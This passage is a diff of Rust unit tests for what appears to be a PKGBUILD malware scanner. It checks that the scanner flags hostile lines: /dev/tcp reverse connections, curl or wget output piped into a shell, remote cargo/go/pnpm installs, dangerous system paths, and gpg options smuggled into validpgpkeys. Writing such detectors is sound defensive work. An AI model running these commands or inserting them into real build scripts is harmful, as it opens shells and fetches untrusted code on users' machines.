+        assert!(dev_tcp_line("cat < /dev/udp/10.0.0.1/53"));
+        assert!(dev_tcp_line("echo x >& /dev/tcp/1.2.3.4/8080"));
+        // The sh -c wrapper is caught by shell_c too; either way it's flagged.
+        assert!(dev_tcp_line("sh -c 'exec 3<>/dev/tcp/x/443'"));
+        assert!(!dev_tcp_line("# see /dev/tcp docs"));
+        assert!(!dev_tcp_line("curl https://x/dev/tcp-docs"));
+    }
+
+    #[test]
+    fn shell_heredoc_exec_detected() {
+        // Interpreter reading a heredoc.
+        assert_eq!(
+            line_of_shell_heredoc_exec("bash <<EOF\ncurl -s https://x/y | sh\nEOF"),
+            Some(1)
+        );
+        // Heredoc piped into a shell through cat.
+        assert!(line_of_shell_heredoc_exec("cat <<'E'\necho pwned\nE\n").is_none());
+        assert_eq!(
+            line_of_shell_heredoc_exec("cat <<'E' | sh\necho pwned\nE\n"),
+            Some(1)
+        );
+        // Fetch inside the body, shell at the heredoc start.
+        assert_eq!(
+            line_of_shell_heredoc_exec("sh <<-EOF\n  wget -qO- https://x/s | bash\n  "),
+            Some(1)
+        );
+        // Benign heredocs stay clean: plain file writes, empty scripts.
+        assert!(line_of_shell_heredoc_exec("cat <<EOF\nhello world\nEOF\n").is_none());
+        assert!(line_of_shell_heredoc_exec("bash <<EOF\nEOF\n").is_none());
+        assert!(line_of_shell_heredoc_exec("# bash <<EOF\n# curl x\n# EOF\n").is_none());
+        // Here-strings are not heredocs.
+        assert!(line_of_shell_heredoc_exec("grep foo <<< \"<<curl stuff\"\n").is_none());
+    }
+
+    #[test]
+    fn toolchain_installs_detected_and_local_targets_clean() {
+        // Remote crates/modules: flagged.
+        assert!(toolchain_install_line("cargo install evil-cli"));
+        assert!(toolchain_install_line("cargo install --locked evil-cli"));
+        assert!(toolchain_install_line("cargo install --root \"$pkgdir\"/usr evil-cli"));
+        assert!(toolchain_install_line("go install github.com/evil/tool@latest"));
+        assert!(toolchain_install_line("go install github.com/evil/tool@v1.0.0"));
+        // Local targets: the normal packaging flow.
+        assert!(!toolchain_install_line("cargo install --path ."));
+        assert!(!toolchain_install_line("cargo install --path \"$pkgdir\""));
+        assert!(!toolchain_install_line("go install -v ./..."));
+        // -C is value-taking (matched lowercased): the value must not be
+        // mistaken for the package name hiding the remote module behind it.
+        assert!(toolchain_install_line("go install -C sub github.com/evil/t@latest"));
+        assert!(!toolchain_install_line("go install -C sub ./cmd/tool"));
+        assert!(!toolchain_install_line("go install -ldflags '-s -w' ./cmd/foo"));
+        assert!(!toolchain_install_line("go install ./cmd/tool"));
+        // Ambiguous short go name may be in-module: stay quiet.
+        assert!(!toolchain_install_line("go install tool"));
+        // Comments don't count.
+        assert!(!toolchain_install_line("# cargo install evil-cli"));
+        // pnpm rides with the npm check.
+        assert!(foreign_pkg_manager_install_line("pnpm add @evil/thing"));
+        assert!(foreign_pkg_manager_install_line("pnpm install evil-cli"));
+        assert!(foreign_pkg_manager_install_line("pnpm i -g evil"));
+        // The legit no-arg flows still don't fire.
+        assert!(!foreign_pkg_manager_install_line("pnpm install"));
+        assert!(!foreign_pkg_manager_install_line("npm ci"));
+        // Regression guard: payload installed into $pkgdir stays flagged.
+        assert!(foreign_pkg_manager_install_line(
+            "npm install -g --prefix \"$pkgdir\"/usr @evil/thing"
+        ));
+    }
+
+    #[test]
+    fn new_dangerous_pkg_paths_match() {
+        for member in [
+            "usr/lib/tmpfiles.d/evil.conf",
+            "usr/lib/modules-load.d/evil.conf",
+            "usr/lib/binfmt.d/evil.conf",
+            "etc/pam.d/evil",
+            "etc/dbus-1/system.d/evil.conf",
+            "usr/share/dbus-1/system.d/evil.conf",
+            "etc/NetworkManager/dispatcher.d/10-evil",
+            "usr/lib/environment.d/evil.conf",
+        ] {
+            let normalized = normalize_pkg_path(member);
+            assert!(
+                DANGEROUS_PKG_PATH_SUBSTR
+                    .iter()
+                    .any(|sub| normalized.contains(sub)),
+                "{} should match the dangerous list",
+                member
+            );
+        }
+    }
+
+    #[test]
+    fn full_scan_sees_the_new_blind_zone_payloads() {
+        let src = "pkgname=evil\nbuild() {\n  bash <(curl -sL https://x/y)\n\
+                   gunzip -c p.gz | sh\n  exec 3<>/dev/tcp/x/443\n\
+                   go install github.com/evil/t@latest\n}\n";
+        let findings = scan_pkgbuild_source(src);
+        assert!(
+            findings.iter().any(|f| f.message.contains("process substitution")),
+            "bash <(curl) missing: {findings:?}"
+        );
+        assert!(
+            findings.iter().any(|f| f.message.contains("decompresses")),
+            "gunzip | sh missing: {findings:?}"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("/dev/tcp//dev/udp")),
+            "/dev/tcp missing: {findings:?}"
+        );
+        assert!(
+            findings
+                .iter()
+                .any(|f| f.message.contains("cargo/go install")),
+            "go install missing: {findings:?}"
+        );
     }
 
     // ── base64 -d | sh / xxd -r -p | bash / source <(curl ...) ──────────
@@ -3087,6 +3823,19 @@ package() {
     #[test]
     fn validpgpkeys_absent() {
         assert!(parse_validpgpkeys("pkgname=foo\npkgver=1.0\n").is_empty());
+    }
+
+    #[test]
+    fn validpgpkeys_options_are_dropped() {
+        // Each entry goes to `gpg --recv-keys <id>`: a gpg option would
+        // be parsed as a flag, so only hex ids/fingerprints survive.
+        let src = "validpgpkeys=('--keyserver=evil.example.com' \
+                    'ABCDEF0123456789ABCDEF0123456789ABCDEF01' \
+                    '--faked-system-time=2020')";
+        assert_eq!(
+            parse_validpgpkeys(src),
+            vec!["ABCDEF0123456789ABCDEF0123456789ABCDEF01"]
+        );
     }
 
     #[test]
